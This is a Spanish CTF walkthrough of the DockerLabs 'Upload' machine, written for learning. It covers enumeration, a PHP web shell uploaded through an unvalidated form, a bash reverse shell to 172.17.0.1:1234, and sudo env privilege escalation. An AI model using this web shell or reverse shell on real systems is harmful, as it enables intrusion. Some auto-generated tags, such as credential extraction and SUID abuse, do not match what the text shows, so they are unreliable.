---
title: Upload
node_type: machine
platform: dockerlabs
difficulty: facil
os: linux
source_path: Maquinas De Dockerlabs/Maquinas Faciles/Upload.md
needs_review: false
---

<!-- AUTO-GENERATED: BanditBox knowledge base. Safe to overwrite. -->

# Upload

## Resumen

Upload es el caso directo de subida de archivos maliciosos: se identifica la funcionalidad web, se transforma en web shell o RCE y se revisan binarios locales para elevar privilegios en Linux.

Fuente original: [Maquinas De Dockerlabs/Maquinas Faciles/Upload.md](https://github.com/8andit0/BanditBox/blob/main/Maquinas%20De%20Dockerlabs/Maquinas%20Faciles/Upload.md)

## Datos clave

| Campo | Valor |
|---|---|
| Plataforma | DockerLabs |
| Dificultad | facil |
| Sistema operativo | linux |
| Puertos detectados por texto | 1234 |
| Imagenes en fuente | 26 |
| Palabras en fuente | 1990 |
| Requiere revision | false |

## Resolucion paso a paso

>Hoy, vamos con una maquinita muy pero que muy sencilla, donde veremos conceptos de subida de archivos maliciosos en una web, así que vamos :3

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516145113.png)

>Primero, levantamos la máquina, descomprimiendo el “.zip” y ejecutando el script de automatización:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516145201.png)

>Con el comando Ping, vamos a verificar la conexión con la maquina, con unas cuantas trazas ICMP:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516145308.png)
_(Con esto en pocas palabras; enviamos tramas ICMP “Internet Control Message Protocol” tipo (Echo Request) a la ip victima, esta misma, al estar en funcionamiento, revisa las cabeceras del paquete para determinar que es para ella, y responde con un (Echo Reply).)

1. _Podemos ver el orden de estas tramas ICMP en el apartado “icmp_seq=”,
2. _Con el valor de “ttl=” podemos ver el número máximo de saltos que puede dar un paquete antes de descartarse (Por lo general funciona para determinar el sistema operativo víctima)
3. _Con el valor “time=” podemos ver el tiempo entre el “Echo Request” y el “Echo Reply”)

>Ya que sabemos que tenemos conexión con la maquina, vamos a escanear sus puertos abiertos y sus servicios, en búsqueda de vectores de ataque:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516145542.png)
1. _-- min-rate 5000 (quiero tramitar mínimo 5000 paquetes por segundo) esto para que el escaneo vaya con bastante agilidad._
2. _-n (no deseo que nmap haga una resolución DNS automática)
3. _-p- (quiero escanear los 65535 puertos del sistema, no los 1000 más comunes, como normalmente hace nmap)._
4. _-Pn (Omite el descubrimiento de Host)_
5. _-sCV (Aquí se concatena el parámetro -sV que realiza un reconocimiento de versiones de servicios, y el parámetro -sC que aplica unos cuantos scripts de reconocimiento propios de nmap_

>Vemos una versión 2.4.52 de Apache httpd sin ningún otro puerto abierto. Al no ver mucho mas en el escaneo, vamos a la web a echar un ojo O.o

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516150210.png)

>Encontramos un panel de subida de archivos. Intentamos subir un archivo sencillo en php probando si nos lo permite:

```php
<?php
echo "TESTING";
?>
```

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516151729.png)

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516151815.png)

>Vemos que el servidor si que nos permite subir archivos .php, si por casualidad, en alguna parte de la web encontramos el directorio donde se guardan estos archivos subidos (y se interpreta el código php) tenemos la opción de llegar a un RCE (Remote Code Execution), así que:

>Realizamos un fuzzing en la web, a ver si encontramos algo interesante. Hay muchas herramientas para enumerar directorios; [Dirb](https://www.kali.org/tools/dirb/), [Gobuster](https://github.com/OJ/gobuster), [Wfuzz](https://www.kali.org/tools/wfuzz/), Pero tal vez la más eficiente es [ffuf](https://github.com/ffuf/ffuf), así que para usarla:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516150858.png)
1. _-c Para que se vea bonito con colorcitos_ ╰(*°▽°*)╯
2. _-w Para especificar el diccionario que se probará en la url (uso un diccionario de [Seclists](https://github.com/danielmiessler/SecLists) )_
3. _-t Para indicarle la cantidad de hilos (tareas múltiples) que deseo para la tarea a realizar, en este caso 200_
4. _-u Indicamos la web a atacar, con la palabra interna FUZZ le indicamos a la herramienta que parte de la url debe ser cambiada por las palabras del el diccionario._

>Nos encontramos con un directorio Uploads:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516151102.png)

>Al verlo en la web, vemos que esta mal configurado, la opción _Listing_ esta habilitada. En una vulnerabilidad de "Directory Listing" podemos ver el árbol de archivos de una web.

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516152437.png)

>Así que podemos listar los archivos subidos desde "Upload.php" y acceder a ellos desde la web:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516152608.png)
_Sabemos que el php se ejecuta, ya que no se muestra el código en si (contenido) del archivo que subimos, si no su ejecución en php (imprimiendo por pantalla "Testing")_

>Vemos que no solamente podemos ver los archivos, si no que el código php se ejecuta.
>Esto se da porque el directorio "Uploads" esta mal configurado, no se comporta como directorio estático, si no que todo archivo subido a allí será ejecutado por el motor de PHP, mas adelante, al vulnerar el sistema, veremos un poco del código vulnerable. Por ahora, vamos a llegar a un RCE subiendo un archivo infectado.

```php
<?php
echo "<pre>" . shell_exec($_REQUEST['hacked']) . "</pre>";
?>
```

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516154340.png)
_En php $_REQUEST recoge información de un parámetro "hacked", y la función "shell_exec" ejecuta lo proporcionado directamente en el sistema. Es decir, en teoría, si al parámetro le pasamos un valor “whoami”, $_REQUEST recogerá ese dato, y "shell_exec" lo ejecutara en el sistema, para finalmente (como todo está dentro de un “echo”) mostrarse en pantalla la respuesta del comando

>Ya con nuestro payload creado, lo subimos:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516154654.png)

>Y desde el directorio Uploads lo ejecutamos:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516154817.png)

>Claro, para que funcione bien nuestro payload, debemos pasar el parámetro hacked a la web, y darle un valor a el mismo:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516163047.png)
_Agregamos al archivo php el parámetro hacked y luego a este el comando que queremos ejecutar, con la sintaxis predilecta "archivo?parametro=valor del parámetro"_

>Ya tenemos Ejecución Remota De Comandos  ╰(*°▽°*)╯
>Vamos a por una Reverse Shell sin mas, para ello podemos usar la web [Revshell](https://www.revshells.com/) o usar el típico:

```bash
bash -c "bash -i >& /dev/tcp/172.17.0.1/1234 0>&1"
```

>Primero, debemos disponer nuestra máquina para recibir una Shell desde otro equipo, para esto, nos ponemos en escucha por el puerto 1234 con “nc”:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516163600.png)
1. nc Es un binario multipropósito, sirve para ejecutar shells, transferir archivos, enviar y recibir datos, etc, etc…
2. -n Igual que con nmap, este parámetro nos quita la resolución automática de nombres de host (para acelerar el proceso)
3. -l Con este parámetro entramos en un modo de escucha de conexiones
4. -v El modo verbose lo usamos para ver más detalles sobre la escucha e información de la conexión
5. -p con este parámetro indicamos el puerto que estará en escucha, en este caso el 1234

>Ya en escucha, ejecutamos el payload desde la web:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516163759.png)
_//El %26 es una codificación en URL de “&” para que no hayan problemas//_
_Vamos a intentar entenderlo al máximo este comando:_
1. _bash -c Ejecuta lo siguiente dentro de las comillas como una subshell, en pocas palabras, ejecuta el comando entre comillas como si fuera un script de bash._
2. _bash -i Lanza una bash en modo interactivo (para tener una shell medianamente funcional)_
3. _>%26 /dev/tcp/172.17.0.1/1234 0>%261 Es una manera PROPIA de bash para abrir una conexión TCP hacia una ip y un puerto, con la primera parte >%26 /dev/tcp/ip/puerto dirigimos el stdout (respuestas de la shell) de la maquina victima a nuestra ip, y con la segunda parte 0>%261 indicamos que el stdin(comandos que insertamos) de nuestra máquina irá a la ip victima para ser interpretado. En pocas palabras, abrimos una comunicación bidireccional entre nuestra ip y la ip victima, redireccionando nuestra entrada estándar (stdin) y la salida estándar de la víctima (stdout)._

>Y recibimos una Reverse Shell :3

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516163928.png)

 >Haremos un tratamiento de la TTY para una web mas interactiva y menos problemática, primero:

```bash
 script /dev/null -c bash
```
_Script solicita una PTY (Pseudo terminal) al kernel, luego, ejecuta en el proceso hijo que se crea el comando que pasamos con la flag "-c", es decir una bash. Por ultimo, script no graba nada de la sesión al redirigirlo al /dev/null (Si no esta script disponible, puedes usar Python: python3 -c 'import pty; pty.spawn("/bin/bash")')._

>Ahora, con un CTRL+Z enviamos la Reverse Shell a segundo plano y desde nuestra terminal:

```bash
stty raw -echo; fg
```
1. _stty es la herramienta que nos ayudara a cambiar los parámetros de la terminal (eco, señales, etc.)
2. _raw es la flag que nos ayudara a desactivar el procesamiento de señales como CTRL+C (para que al hacerlo la Shell no muera) o CTRL+Z (para no poner en segundo plano la Shell por error)
3. _-echo Desactiva el echo del teclado, que nos puede dar problemas
4. _; fg (foreground) devuelve a primer plano nuestra querida Shell O.O

>Por ultimo vamos a establecer las variables de entorno correctas para una Shell totalmente funcional:

```bash
export TERM=xterm
export SHELL=/bin/bash
```
_Le estamos diciendo a la Shell que deseamos que la variable de entorno TERM (responsable de especificar el tipo de terminal usado), sea igual a Xterm.
Sí TERM está mal establecido en la máquina, cosas como clear, nano, vim, less, no funcionan correctamente. Y luego Establecemos /bin/bash como la Shell por defecto para que otras herramientas lo usen.

>Ya con una Shell buena, listamos privilegios en el sistema, para determinar si tenemos permisos especiales sobre algún binario:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516173251.png)
_Ejecutamos el binario setuid (que siempre se ejecuta como root)“SUDO”, con la flag “-l”. El binario busca los privilegios que el usuario actual tiene descritos en el archivo /etc/sudoers y los muestra por pantalla (Si aplica)_
1. _(root) Permite ejecutar el binario como el usuario mas privilegiado_
2. _NOPASSWD Nos indica que no es necesario ingresar contraseña para ejecutar el binario_
3. _/usr/bin/env Binario sobre el que tenemos privilegios (cuya ruta está definida arriba en “secure_path”_

>Vemos que podemos ejecutar el binario /usr/bin/env como root
>Este anterior, es un binario que puede ejecutar comandos de forma flexible, como nosotros tenemos privilegios para usarlo con SUDO (Como root), podemos ejecutar cualquier binario en el contexto del usuario root, o eso dice [GTFOBins](https://gtfobins.github.io/gtfobins/env/)

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516174632.png)

>Ponerlo en practica, es tan sencillo como:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250516174736.png)

>Pero, antes de borrar todos los archivos del sistema, vamos a analizar un poco la web vulnerable como dijimos mas arriba:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250517001424.png)

>Al listar los permisos de la carpeta Uploads, vemos que los tiene todos, por eso logramos listar archivos dentro de la misma como usuario www-data, si le quitamos el permiso de lectura:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250517001730.png)
![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250517001809.png)

>Vemos que de por si no podríamos ingresar a la carpeta que antes listamos por completo. Ahora bien, esto solucionaría SOLO el _Directory Listing_, pero realmente también se puede realizar la explotación sin ver la carpeta. Lo vulnerable en si, esta en Upload.php

>Al analizarlo un poco, se ve que el archivo no hace ninguna validación de el tipo de archivo que subimos ni de su contenido, es por ello que pudimos subir libremente nuestra Shell, y esta porción del código:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250517004950.png)
_La variable $targetFile concatena lo que hay en la variable $TargetDirectory (el directorio Uploads) directamente con lo subido por el usuario, validando SOLO que el nombre no tenga rutas con la función basename_

>Es por ello que pudimos subir libremente nuestra Shell, y esta porción del código:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250517004300.png)
_La función move_uploaded_file  "mueve" el archivo desde su ubicación temporal a la variable $targetFile_ que como vimos antes tiene la ruta /Uploads/nombre_del_archivo

>En síntesis, deja el archivo sin ningún tipo de cuidado en el directorio Uploads, al que podemos acceder.
>Ya, podemos borrar los archivos del sistema ╰(*°▽°*)╯


## Cadena de ataque detectada

- **Enumeration**: Apache, Connectivity check, HTTP, PHP, Port enumeration, Web enumeration
- **Initial Access**: Malicious file upload, Remote Code Execution
- **Post Exploitation**: Credential extraction, TTY stabilization
- **Privilege Escalation**: SUID abuse, SUID binary abuse


## Tecnicas utilizadas

- [Connectivity check](../../../techniques/connectivity-check.md)
- [Credential extraction](../../../techniques/credential-extraction.md)
- [Malicious file upload](../../../techniques/malicious-file-upload.md)
- [Port enumeration](../../../techniques/port-enumeration.md)
- [Remote Code Execution](../../../techniques/rce.md)
- [SUID abuse](../../../techniques/suid-abuse.md)
- [TTY stabilization](../../../techniques/tty-stabilization.md)
- [Web enumeration](../../../techniques/web-enumeration.md)


## Herramientas utilizadas

- [FFUF / WFuzz](../../../tools/ffuf-wfuzz.md)
- [Gobuster](../../../tools/gobuster.md)
- [GTFOBins](../../../tools/gtfobins.md)
- [Netcat](../../../tools/netcat.md)
- [Nmap](../../../tools/nmap.md)
- [Ping](../../../tools/ping.md)
- [Python](../../../tools/python.md)
- [sudo](../../../tools/sudo.md)


## Servicios relacionados

- [Apache](../../../services/apache.md)
- [HTTP](../../../services/http.md)
- [PHP](../../../services/php.md)


## Vulnerabilidades relacionadas

- [Insecure file upload](../../../vulnerabilities/insecure-file-upload.md)
- [SUID misconfiguration](../../../vulnerabilities/suid-misconfiguration.md)
- [Weak credentials](../../../vulnerabilities/weak-credentials.md)


## Metodos de escalada

- [SUID binary abuse](../../../privilege_methods/suid-binary-abuse.md)
